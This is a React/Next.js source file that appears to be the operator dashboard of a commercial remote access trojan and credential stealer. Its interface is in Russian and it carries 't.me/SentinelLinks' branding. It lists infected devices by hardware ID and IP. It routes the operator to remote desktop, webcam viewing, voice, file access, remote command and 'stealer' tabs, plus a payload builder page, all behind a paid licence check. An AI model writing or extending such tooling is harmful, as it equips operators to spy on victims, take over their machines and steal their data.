// t.me/SentinelLinks

// t.me/SentinelLinks
"use client"

import { useState, useEffect, useRef } from "react"
import { Sidebar } from "@/components/sidebar"
import { RemoteDesktop } from "@/components/remote-desktop"
import { Header } from "@/components/header"
import { FunTab } from "@/components/fun-tab"
import { FilesTab } from "@/components/files-tab"
import { DesignSettings } from "@/components/design-settings"
import { AdminPage } from "@/components/admin-page"
import { WelcomePage } from "@/components/welcome-page"
import { DesignPage } from "@/components/design-page"
import { BuilderPage } from "@/components/builder-page"
import { RemoteCmdTab } from "@/components/remote-cmd-tab"
import { WebcamViewer } from "@/components/webcam-viewer"
import { VoiceChatTab } from "@/components/voice-chat-tab"
import { StealerTab } from "@/components/stealer-tab"
import { AuthPage } from "@/components/auth-page"
import { LicenseActivationPage } from "@/components/license-activation-page"
import { Footer } from "@/components/footer"
import { UsersPage } from "@/components/users-page"
import { hasValidLicense, type User as DBUser } from "@/lib/db"

export type User = {
  id: string
  name: string
  hostname: string
  status: "online" | "offline" | "away"
  ip: string
  os: string
  lastSeen: string
  hwid?: string
}

export type TabType = "desktop" | "webcam" | "fun" | "files" | "cmd" | "voice" | "stealer" | "builder" | "design"

export type PageType = "home" | "design" | "builder" | "admin" | "users"

interface AuthState {
  isAuthenticated: boolean
  user: DBUser | null
}

export default function Home() {
  // Auth state
  const [authState, setAuthState] = useState<AuthState | null>(null)
  const [isAuthLoading, setIsAuthLoading] = useState(true)

  // App state
  const [selectedUser, setSelectedUser] = useState<User | null>(null)
  const [activeTab, setActiveTab] = useState<TabType>("desktop")
  const [activePage, setActivePage] = useState<PageType>("home")
  const [users, setUsers] = useState<User[]>([])
  const [isScanning, setIsScanning] = useState(true)
  const [failedAttempts, setFailedAttempts] = useState(0)
  const [autoRefresh, setAutoRefresh] = useState(true)
  const [serverError, setServerError] = useState<string | null>(null)
  const [connectedHWIDs, setConnectedHWIDs] = useState<Set<string>>(new Set())
  const [showAllDevices, setShowAllDevices] = useState(false)

  const usersRef = useRef<User[]>([])

  useEffect(() => {
    const loadAuthState = async () => {
      const sessionAuth = sessionStorage.getItem("grob-auth")
      if (sessionAuth) {
        try {
          const storedUser = JSON.parse(sessionAuth) as DBUser

          if (storedUser && !storedUser.blocked) {
            setAuthState({ isAuthenticated: true, user: storedUser })
          } else {
            sessionStorage.removeItem("grob-auth")
            setAuthState({ isAuthenticated: false, user: null })
          }
        } catch (error) {
          sessionStorage.removeItem("grob-auth")
          setAuthState({ isAuthenticated: false, user: null })
        }
      } else {
        setAuthState({ isAuthenticated: false, user: null })
      }
      setIsAuthLoading(false)
    }
    loadAuthState()
  }, [])

  // Fetch clients when authenticated with valid license
  useEffect(() => {
    if (!authState?.isAuthenticated || !hasValidLicense(authState.user)) {
      return
    }

    if (failedAttempts >= 3 && autoRefresh) {
      setAutoRefresh(false)
      setServerError("Не удалось подключиться к серверу. Проверьте настройки.")
      return
    }

    if (!autoRefresh) {
      return
    }

    const fetchClients = async () => {
      try {
        const uid = authState.user?.uid
        const isAdmin = authState.user?.is_admin

        let apiUrl = "/api/devices"
        if (uid && (!isAdmin || !showAllDevices)) {
          apiUrl += `?uid=${encodeURIComponent(uid)}`
        }

        const response = await fetch(apiUrl)

        if (response.ok) {
          const data = await response.json()

          if (data.devices) {
            const newDevices = data.devices as User[]

            const existingUsers = usersRef.current

            // Create a map of new devices by id
            const newDeviceMap = new Map(newDevices.map((d) => [d.id, d]))

            // Update existing users or add new ones
            const mergedUsers: User[] = []

// t.me/SentinelLinks
            // Add all new online devices
            for (const device of newDevices) {
              mergedUsers.push(device)
            }

            // Keep offline users that aren't in new list (mark as offline)
            for (const existingUser of existingUsers) {
              if (!newDeviceMap.has(existingUser.id)) {
                // User disconnected, mark as offline but keep in list
                mergedUsers.push({
                  ...existingUser,
                  status: "offline",
                  lastSeen: new Date().toISOString(),
                })
              }
            }

            // Remove duplicates by id
            const uniqueUsers = Array.from(new Map(mergedUsers.map((u) => [u.id, u])).values())

            usersRef.current = uniqueUsers
            setUsers(uniqueUsers)
            setIsScanning(false)
            setFailedAttempts(0)
            setServerError(null)
          }
        } else {
          setIsScanning(false)
          setFailedAttempts((prev) => prev + 1)
        }
      } catch (error: unknown) {
        setFailedAttempts((prev) => prev + 1)
        setIsScanning(false)
      }
    }

    fetchClients()

    const scanInterval = setInterval(() => {
      if (autoRefresh) {
        fetchClients()
      }
    }, 3000)

    return () => clearInterval(scanInterval)
  }, [failedAttempts, autoRefresh, authState, showAllDevices])

  useEffect(() => {
    if (users.length > 0) {
      localStorage.setItem("grob_devices", JSON.stringify(users))
    }
  }, [users])

  const handleManualRefresh = () => {
    setFailedAttempts(0)
    setAutoRefresh(true)
    setServerError(null)
    setIsScanning(true)
  }

  const handleAuth = (user: DBUser) => {
    setAuthState({ isAuthenticated: true, user })

    sessionStorage.setItem("grob-auth", JSON.stringify(user))
    sessionStorage.setItem("user", JSON.stringify(user))
  }

  const handleLogout = () => {
    sessionStorage.removeItem("grob-auth")
    setAuthState({ isAuthenticated: false, user: null })
    setSelectedUser(null)
    setUsers([])
    usersRef.current = []
    setActivePage("home")
  }

  const handleLicenseActivated = async () => {
    if (authState?.user) {
      try {
        const response = await fetch("/api/auth/login", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            username: authState.user.username,
            password: authState.user.password,
          }),
        })
        const data = await response.json()
        if (data.user) {
          setAuthState({ isAuthenticated: true, user: data.user })
          sessionStorage.setItem("grob-auth", JSON.stringify(data.user))
          sessionStorage.setItem("user", JSON.stringify(data.user))
        }
      } catch (error) {
        console.error("Error updating user after license activation:", error)
      }
    }
  }

  const toggleShowAllDevices = () => {
    setShowAllDevices(!showAllDevices)
  }

  const handleConnectToUser = (user: User) => {
    setSelectedUser(user)
    setActivePage("home")
    setActiveTab("desktop")
  }

  // Loading state
  if (isAuthLoading) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center">
        <div className="animate-pulse text-muted-foreground">Загрузка...</div>
      </div>
    )
  }

  // Not authenticated - show login page
  if (!authState?.isAuthenticated) {
    return <AuthPage onAuth={handleAuth} />
  }

  // Authenticated but no valid license - show license activation page
  if (!hasValidLicense(authState.user)) {
    return <LicenseActivationPage user={authState.user!} onActivated={handleLicenseActivated} onLogout={handleLogout} />
  }

  const renderContent = () => {
    if (activePage === "admin") {
      return <AdminPage currentUser={authState.user} />
    }

// t.me/SentinelLinks
    if (activePage === "design") {
      return <DesignPage />
    }

    if (activePage === "builder") {
      return <BuilderPage />
    }

    if (activePage === "users") {
      return (
        <UsersPage
          users={users}
          onConnect={handleConnectToUser}
          isScanning={isScanning}
          onRefresh={handleManualRefresh}
        />
      )
    }

    if (!selectedUser) {
      return <WelcomePage serverError={serverError} onRefresh={handleManualRefresh} />
    }

    switch (activeTab) {
      case "desktop":
        return <RemoteDesktop selectedUser={selectedUser} />
      case "webcam":
        return <WebcamViewer selectedUser={selectedUser} />
      case "stealer":
        return <StealerTab selectedUser={selectedUser} currentUser={authState.user!} />
      case "fun":
        return <FunTab selectedUser={selectedUser} />
      case "files":
        return <FilesTab selectedUser={selectedUser} />
      case "cmd":
        return <RemoteCmdTab selectedUser={selectedUser} />
      case "voice":
        return <VoiceChatTab selectedUser={selectedUser} />
      case "design":
        return <DesignSettings />
      default:
        return <RemoteDesktop selectedUser={selectedUser} />
    }
  }

  return (
    <div className="flex h-screen bg-background pb-8">
      <Sidebar
        users={users}
        selectedUser={selectedUser}
        onSelectUser={setSelectedUser}
        activePage={activePage}
        onPageChange={setActivePage}
        isScanning={isScanning}
        onRefresh={handleManualRefresh}
        currentUser={authState.user}
        onLogout={handleLogout}
        showAllDevices={showAllDevices}
        onToggleShowAll={toggleShowAllDevices}
      />
      <div className="flex-1 flex flex-col">
        {activePage === "home" && selectedUser && (
          <Header selectedUser={selectedUser} activeTab={activeTab} setActiveTab={setActiveTab} />
        )}
        {renderContent()}
      </div>
      <Footer user={authState.user} />
    </div>
  )
}

//  ____             _   _            _
// / ___|  ___ _  | |_(_)_    ___| |   
// \___ \ / _ \ '_ \| | | '_ \ / _ \ | 
//  ___) |  / | | | |_| | | | |  / |   
// |____/ \___|_| |_|\|_|_| |_|\___|_| 
// ********************************    
